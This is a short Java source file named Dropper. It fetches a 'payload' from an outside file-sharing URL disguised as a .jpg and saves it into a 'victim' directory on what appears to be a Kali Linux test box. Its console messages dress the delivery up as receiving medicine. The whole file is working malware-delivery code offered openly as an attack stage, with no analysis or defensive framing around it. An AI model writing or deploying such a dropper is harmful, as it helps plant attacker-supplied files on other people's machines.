import java.io.*;
import java.net.*;

public class Dropper {
    public static void main(String[] args) {
        String fileURL = "https://anonsharing.com/cache/plugins/filepreviewer/47310/3add0bceed4257e3ca146742930f1f7bf8f90e0b09157a5b6cfe809414dcaf93/1100x800_cropped.jpg"; // Specify your URL for the payload
        String saveDir = "/home/kali/Downloads"; // Specify the dir for the victim, in this case, it's Kali

        try {
            URL url = new URL(fileURL);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            int responseCode = httpConn.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");

                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10, disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1);
                }

                String saveFilePath = saveDir + File.separator + fileName;

                InputStream inputStream = httpConn.getInputStream();
                FileOutputStream outputStream = new FileOutputStream(saveFilePath);

                int bytesRead;
                byte[] buffer = new byte[4096];
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }

                outputStream.close();
                inputStream.close();

                System.out.println("Medicines saved to: " + saveFilePath); // Say "YAYY"

                // Success message after the payload gets delivered
                System.out.println("You got your Prescriptions, Make sure to have your food before taking them.");

            } else {
                System.out.println("Sorry, Your meds seem to be expired. Doctor replied with HTTP code: " + responseCode); //If anything goes wrong
            }
            httpConn.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
